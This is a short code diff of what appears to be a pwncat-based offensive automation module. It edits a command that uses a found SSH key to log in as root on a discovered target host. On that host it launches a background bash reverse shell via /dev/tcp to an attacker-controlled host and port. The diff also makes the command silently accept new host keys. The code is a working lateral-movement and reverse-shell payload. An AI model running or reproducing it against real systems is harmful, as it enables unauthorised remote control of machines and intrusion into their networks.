@@ -94,10 +94,10 @@ def execute(session: pwncat.manager.Session, task):
                 ssh_targets = f.readlines.splitlines()
             session.log(f"found ssh target - {ssh_targets[0]}")
 
-            # ideally we determin the key using the ssh_keys archive paths
-            # and enumerate? but for not this will have to _cheat a little
+            # ideally we determine the key using the ssh_keys archive paths
+            # and enumerate? but for not this will have to _cheat_ a little
 
-            ssh_paylod = f'ssh -i ~/.ssh/secret_key root@{ssh_targets[0]} "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"'
+            ssh_paylod = f'ssh -o StrictHostKeyChecking=accept-new -i ~/.ssh/secret_key root@{ssh_targets[0]} "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"'
             session.log(
                 f"starting reverse shell hand off on remote host off via ssh: {ssh_paylod}")
             result = session.platform.run(
